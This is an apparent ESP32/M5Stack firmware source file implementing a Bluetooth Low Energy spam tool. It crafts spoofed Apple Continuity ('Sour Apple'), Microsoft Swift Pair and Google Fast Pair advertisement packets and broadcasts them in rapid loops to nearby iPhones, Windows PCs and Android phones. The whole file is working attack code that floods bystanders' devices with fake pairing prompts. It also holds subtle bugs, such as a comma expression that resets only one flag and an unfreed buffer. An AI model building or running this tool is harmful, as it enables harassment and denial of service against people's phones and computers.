#include "globals.h"

extern Logger l;
extern Led led;

class BLE
{
public:
	BLE() {}

	bool init()
	{
		try {
			NimBLEDevice::init("");
			server = NimBLEDevice::createServer();
			adv = server->getAdvertising();
			return true;
		} catch (...) {
			return false;
		}
	}

	bool destroy()
	{
		try
		{
			NimBLEDevice::deinit();
			return true;
		}
		catch (...)
		{
			return false;
		}
	}

	void advertiseApple() {
		for (int i = 0; i < 3; i++) {

			NimBLEAdvertisementData advData = getOAdvertisementData();

			adv->setAdvertisementData(advData);
			adv->setMinInterval(0x20);
			adv->setMaxInterval(0x20);
			adv->setMinPreferred(0x20);
			adv->setMaxPreferred(0x20);

			adv->start();
			led.flash();
			delay(20);
			adv->stop();
		}
	}

	void advertiseWindows() {
		for (int i = 0; i < 3; i++) {
			NimBLEAdvertisementData advData = getSwiftAdvertisementData();

			adv->setAdvertisementData(advData);
			adv->setMinInterval(0x20);
			adv->setMaxInterval(0x20);
			adv->setMinPreferred(0x20);
			adv->setMaxPreferred(0x20);

			adv->start();
			led.flash();
			delay(20);
			adv->stop();
		}
	}

	void advertiseAndroid() {
		for (int i = 0; i < 3; i++) {
			NimBLEAdvertisementData advData = getAndroidAdvertisementData();

			adv->setAdvertisementData(advData);
			adv->setMinInterval(0x20);
			adv->setMaxInterval(0x20);
			adv->setMinPreferred(0x20);
			adv->setMaxPreferred(0x20);

			adv->start();
			led.flash();
			delay(20);
			adv->stop();
		}
	}

	bool t_advertise_everyone() {
		advertise_everyone = !advertise_everyone;
		advertise_apple, advertise_android, advertise_windows = false;
		return advertise_everyone;
	}

	bool t_advertise_apple() { advertise_apple = !advertise_apple; return advertise_apple; }

	bool t_advertise_android() { advertise_android = !advertise_android; return advertise_android; }

	bool t_advertise_windows() { advertise_windows = !advertise_windows; return advertise_windows; }

	void advertiseEveryoneRender() {
		if (circle_size > 50) 
			circle_size = 1;
			
		int x = M5.Lcd.width() / 2;
		int y = M5.Lcd.height() / 2;

		M5.Lcd.fillCircle(x, y, 100, BLACK);
		for (int i = 1; i <= 4; i++) {
			if (circle_size != 0)
				M5.Lcd.drawCircle(x, y, circle_size / i, BLUE);
		}

		circle_size += 15;
	}

	void loop() {
		if (advertise_apple)
			advertiseApple();
		if (advertise_android)
			advertiseAndroid();
		if (advertise_windows)
			advertiseWindows();

		if (advertise_everyone && (last_update < millis())) {
			advertiseApple();
			advertiseAndroid();
			advertiseWindows();
		}

		if (last_update < millis())
			last_update = millis() + 1000;
	}
public:
	bool advertise_everyone = false;
	bool advertise_apple = false;
	bool advertise_android = false;
	bool advertise_windows = false;

private:
	NimBLEAdvertising *adv;
	NimBLEServer *server;
	int last_update = 0;
	int circle_size = 0;

	/**
	 * Credits https://github.com/RapierXbox/ESP32-Sour-Apple
	 */
	NimBLEAdvertisementData getOAdvertisementData() {
		NimBLEAdvertisementData oAdvertisementData = NimBLEAdvertisementData();
		uint8_t packet[17];
		uint8_t i = 0;

		packet[i++] = 16;	// Packet Length
		packet[i++] = 0xFF; // Packet Type (Manufacturer Specific)
		packet[i++] = 0x4C; // Packet Company ID (Apple, Inc.)
		packet[i++] = 0x00; // ...
		packet[i++] = 0x0F; // Type
		packet[i++] = 0x05; // Length
		packet[i++] = 0xC1; // Action Flags
		const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
		packet[i++] = types[rand() % sizeof(types)]; // Action Type
		esp_fill_random(&packet[i], 3);				 // Authentication Tag
		i += 3;
		packet[i++] = 0x00; // ???
		packet[i++] = 0x00; // ???
		packet[i++] = 0x10; // Type ???
		esp_fill_random(&packet[i], 3);

		oAdvertisementData.addData(std::string((char *)packet, 17));
		return oAdvertisementData;
	}

	NimBLEAdvertisementData getSwiftAdvertisementData() {
		NimBLEAdvertisementData oAdvertisementData = NimBLEAdvertisementData();
		String b_name = String("fs - ") + utilities::gen_random_str(5);
		const char* display_name = b_name.c_str();
		uint8_t display_name_len = strlen(display_name);

		uint8_t size = 7 + display_name_len;
		uint8_t *packet = (uint8_t *)malloc(size);
		uint8_t i = 0;

		packet[i++] = size - 1; // Size
		packet[i++] = 0xFF;		// AD Type (Manufacturer Specific)
		packet[i++] = 0x06;		// Company ID (Microsoft)
		packet[i++] = 0x00;		// ...
		packet[i++] = 0x03;		// Microsoft Beacon ID
		packet[i++] = 0x00;		// Microsoft Beacon Sub Scenario
		packet[i++] = 0x80;		// Reserved RSSI Byte
		for (int j = 0; j < display_name_len; j++)
		{
			packet[i + j] = display_name[j];
		}
		i += display_name_len;

		oAdvertisementData.addData(std::string((char *)packet, size));

		return oAdvertisementData;
	}

	// https://github.com/RogueMaster/flipperzero-firmware-wPlugins/blob/3cb7a817b1bc5269203a0322ae85b412802aa5ec/applications/external/ble_spam/protocols/fastpair.c#L239
	NimBLEAdvertisementData getAndroidAdvertisementData() {
		NimBLEAdvertisementData oAdvertisementData = NimBLEAdvertisementData();
		uint8_t packet[14];
		uint8_t i = 0;

		packet[i++] = 3;	// Packet Length
		packet[i++] = 0x03; // AD Type (Service UUID List)
		packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
		packet[i++] = 0xFE; // ...

		packet[i++] = 6; // Size
		packet[i++] = 0x16; // AD Type (Service Data)
		packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
		packet[i++] = 0xFE; // ...
		const uint32_t model = android_models[rand() % android_models_count].value; // Action Type
		packet[i++] = (model >> 0x10) & 0xFF;
		packet[i++] = (model >> 0x08) & 0xFF;
		packet[i++] = (model >> 0x00) & 0xFF;
		
		packet[i++] = 2; // Size
		packet[i++] = 0x0A; // AD Type (Tx Power Level)
		packet[i++] = (rand() % 120) - 100; // -100 to +20 dBm

		oAdvertisementData.addData(std::string((char *)packet, 14));
		return oAdvertisementData;
	}
};
